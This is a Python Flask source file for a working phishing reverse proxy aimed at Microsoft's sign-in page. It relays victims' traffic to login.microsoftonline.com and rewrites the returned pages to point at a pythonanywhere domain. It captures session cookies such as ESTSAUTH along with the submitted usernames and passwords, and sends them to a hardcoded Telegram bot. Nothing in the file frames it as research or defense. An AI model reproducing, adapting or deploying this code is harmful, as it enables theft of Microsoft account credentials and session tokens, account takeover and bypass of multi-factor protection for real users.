from flask import Flask, request, Response
import requests



from datetime import datetime
import requests
import re
import json
import urllib.parse
# @app.route('/',methods=['POST','GET'])
# def index():
#     if request.method == 'POST':
#         content = request.form['content']
#         db.session.add(Todo(task=content,created=datetime.now().strftime('(%d/%m/%Y) %H:%M')))
#         db.session.commit()
#         return redirect('/')
#     tasks = Todo.query.all()
#     return render_template('index.html',tasks=tasks)

app = Flask(__name__)
# ================== TELEGRAM CONFIG ==================
TELEGRAM_BOT_TOKEN = "8528663337:AAF01JSQMw57owQglPc_oDv90rmPECjHR3k"      # ← Put your bot token
TELEGRAM_CHAT_ID   = "7904698217"        # ← Put your chat id (number)

def send_to_telegram(message: str):
    """Send message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"          # Makes it nicer with <b> and <code>
        }
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Failed to send to Telegram: {e}")

TARGET_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
# TARGET_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL%20openid%20profile%20offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=05b7c4c2-a058-4074-a811-adbe8784a671&x-client-SKU=MSAL.Desktop&x-client-Ver=4.79.2.0&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXBS4JDMAAA0Lt020VRJixVZmKkilFFdj4RiWpF1aenn_d2Ceuzn825lInqBlgebA-0L7S64mo58zEeqcsOaeDCkfg288PbS-AmLtqlM-pgPzcVIqLg-P1ILeXIPA0vf0iTXdpj4KrVebLw3RwoeLPMgC1KYbnP9IxttzUbQD8oiWqEH52ax-apLN7q146hnhbY122Zx9ch8oLBzKUNTz4KqWdawrl3t3l2BANaVhm94A-oj5dzEi02PCt14E1NQqi_dh8EU6eJe3kdRayw6pQ_eSt9fv9tUEkKR0aIJ66cGWZpHvho0rYDpy8STp_1-VX3RUmAvhey4ItHssYC-JsyrihlNA-zvfEWExCvdNj9Azyq-G5CAQAA&msaoauth2=true&instance_aware=true&lc=1033"
TARGET_2 = "https://login.microsoftonline.com/common/GetCredentialType?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL%20openid%20profile%20offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=05b7c4c2-a058-4074-a811-adbe8784a671&x-client-SKU=MSAL.Desktop&x-client-Ver=4.79.2.0&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXBS4JDMAAA0Lt020VRJixVZmKkilFFdj4RiWpF1aenn_d2Ceuzn825lInqBlgebA-0L7S64mo58zEeqcsOaeDCkfg288PbS-AmLtqlM-pgPzcVIqLg-P1ILeXIPA0vf0iTXdpj4KrVebLw3RwoeLPMgC1KYbnP9IxttzUbQD8oiWqEH52ax-apLN7q146hnhbY122Zx9ch8oLBzKUNTz4KqWdawrl3t3l2BANaVhm94A-oj5dzEi02PCt14E1NQqi_dh8EU6eJe3kdRayw6pQ_eSt9fv9tUEkKR0aIJ66cGWZpHvho0rYDpy8STp_1-VX3RUmAvhey4ItHssYC-JsyrihlNA-zvfEWExCvdNj9Azyq-G5CAQAA&msaoauth2=true&instance_aware=true&lc=1033"
TARGET_HOST = "login.microsoftonline.com"
# TARGET_URL = "https://target.com"      # ← Change to your actual target base URL
# TARGET_HOST = "target.com"

FRONTEND_ORIGIN = "https://joeltodo.pythonanywhere.com"   # Your exact frontend origin
PROXY_BASE = "https://joeltodo.pythonanywhere.com"   # Your exact frontend origin

# ===========================================

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])
def proxy(path):
    # Special handling for CORS preflight (OPTIONS) requests
    if request.method == 'OPTIONS':
        response = Response()
        response.headers['Access-Control-Allow-Origin'] = FRONTEND_ORIGIN
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = '*'          # or list specific headers
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Access-Control-Allow-Private-Network'] = 'true'
        return response, 204   # 204 No Content is standard for preflight

    # === Build target URL ===
    target = f"{TARGET_URL.rstrip('/')}/{path.lstrip('/')}?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL%20openid%20profile%20offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=05b7c4c2-a058-4074-a811-adbe8784a671&x-client-SKU=MSAL.Desktop&x-client-Ver=4.79.2.0&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXBS4JDMAAA0Lt020VRJixVZmKkilFFdj4RiWpF1aenn_d2Ceuzn825lInqBlgebA-0L7S64mo58zEeqcsOaeDCkfg288PbS-AmLtqlM-pgPzcVIqLg-P1ILeXIPA0vf0iTXdpj4KrVebLw3RwoeLPMgC1KYbnP9IxttzUbQD8oiWqEH52ax-apLN7q146hnhbY122Zx9ch8oLBzKUNTz4KqWdawrl3t3l2BANaVhm94A-oj5dzEi02PCt14E1NQqi_dh8EU6eJe3kdRayw6pQ_eSt9fv9tUEkKR0aIJ66cGWZpHvho0rYDpy8STp_1-VX3RUmAvhey4ItHssYC-JsyrihlNA-zvfEWExCvdNj9Azyq-G5CAQAA&msaoauth2=true&instance_aware=true&lc=1033"

    print(target)
    print(TARGET_URL)

    # === Prepare headers to forward to target ===
    headers = {}
    for key, value in request.headers:
        if key.lower() not in ['host', 'content-length']:
            headers[key] = value

    headers['Host'] = TARGET_HOST
    headers['X-Forwarded-For'] = request.remote_addr
    headers['X-Forwarded-Host'] = TARGET_HOST
    headers['X-Forwarded-Proto'] = request.scheme
    headers['X-Real-IP'] = request.remote_addr

    # Forward the actual request to the target

    if path == "common/GetCredentialType":
        target = "https://login.microsoftonline.com/common/GetCredentialType"

    if path == "common/login":
        target = "https://login.microsoftonline.com/common/login"

    if path == "appverify":
        target = "https://login.microsoftonline.com/appverify"

    resp = requests.request(
        method=request.method,
        url=target,
        headers=headers,
        data=request.get_data(),
        cookies=request.cookies,
        allow_redirects=False,
        timeout=15
    )

    # === LOGGING (very useful for debugging) ===
    print(f"\n=== PROXY INTERCEPTED ===")
    print(f"Method: {request.method} | Path: /{path}")
    print(f"Target URL: {target}")
    print(f"Status from target: {resp.status_code}")
    if request.get_data():
        print(f"Body from browser: {request.get_data()[:200]}...")

    if request.cookies:
        print(f"Cookies from browser: {dict(request.cookies)}")

    # Log Set-Cookie from target (this is your "cookie grabber")
    if 'Set-Cookie' in resp.headers:
        cookies = resp.headers['Set-Cookie']
        print(f"Captured Set-Cookie: {cookies}")
        # for c in cookies:
        #     print("   →", c)

    if resp.cookies:
        print("→ Parsed cookies (RequestsCookieJar):")
        for name, value in resp.cookies.items():
            print(f"     {name} = {value}")

     # Get ALL Set-Cookie headers properly
    set_cookie_list = [value for name, value in resp.raw.headers.items()
                       if name.lower() == 'set-cookie']

    if set_cookie_list:
        print(f"→ Captured {len(set_cookie_list)} Set-Cookie header(s):")

        full_message = f"<b>New Cookies Captured!</b>\n\n"
        full_message += f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        full_message += f"<b>Path:</b> /{path}\n\n"
        full_message += "<b>Cookies:</b>\n\n"
        if request.get_data():
            try:
                form_data = urllib.parse.parse_qs(request.get_data().decode('utf-8', errors='ignore'))

                print(f"\n→ Parsed Form Data: {form_data}")

                # Extract specific fields
                username = form_data.get('login', [''])[0]
                password = form_data.get('passwd', [''])[0]
                # if username and password:
                full_message += f"<b>Username: {username}</b>\n\n"
                full_message += f"<b>Password: {password}</b>\n\n"
            except:
                pass

        for cookie in set_cookie_list:
            print(f"     → {cookie}")
            full_message += f"<code>{cookie}</code>\n\n"

            # Highlight important Microsoft cookies
            if any(key in cookie.upper() for key in ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'FEDAUTH', 'FPC']):
                full_message += "🔴 <b>IMPORTANT MICROSOFT COOKIE DETECTED!</b>\n\n"

        # Send to Telegram
        if path == "common/login":
            send_to_telegram(full_message)

    else:
        print("→ No Set-Cookie headers")



    # === Build response back to browser ===
    content = resp.content
    content_type = resp.headers.get('Content-Type', '')
    if content_type == 'application/javascript':
        print(content)
    if any(t in content_type for t in ['text/html', 'application/javascript', 'text/css', 'text/plain']):
        try:
            text = content.decode('utf-8')

            # Replace absolute URLs pointing to target.com with proxy URL
            text = re.sub(r'https?://' + re.escape(TARGET_HOST), PROXY_BASE, text, flags=re.IGNORECASE)

            # Also handle protocol-relative URLs (//target.com)
            text = re.sub(r'//'+ re.escape(TARGET_HOST), '//' + PROXY_BASE.split('//')[-1], text, flags=re.IGNORECASE)

            # Handle relative root paths that should go through proxy (optional but helpful)
            # text = re.sub(r'(["\'])/', r'\1' + PROXY_BASE + '/', text)

            print(text)
            content = text.encode('utf-8')
        except:
            pass  # If decoding fails, leave as-is

    # Build final response
    excluded = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    new_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in excluded]

    response = Response(content, resp.status_code, new_headers)

    # CORS headers for the browser
    response.headers['Access-Control-Allow-Origin'] = FRONTEND_ORIGIN
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = '*'
    response.headers['Access-Control-Allow-Credentials'] = 'true'

    # Update Content-Length if we modified the body
    response.headers['Content-Length'] = len(content)

    return response


